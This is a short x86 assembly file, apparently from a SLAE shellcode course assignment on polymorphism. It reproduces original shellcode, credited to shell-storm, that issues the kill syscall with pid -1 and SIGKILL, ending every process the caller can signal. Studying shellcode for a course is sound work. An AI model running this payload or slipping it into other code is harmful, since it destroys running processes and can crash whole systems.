;#SLAE Assignment #06: Polymorphism
;#Original Shellcode from: http://shell-storm.org/shellcode/files/shellcode-212.php


section .text
global _start

_start:	;Original     
	push byte 37	;syscall kill
	pop eax		;syscall kill
	push byte -1	;all processes
	pop ebx		;as arg for kill
	push byte 9	;SIGKILL
	pop ecx		;as arg for kill
	int 0x80	;fire syscall
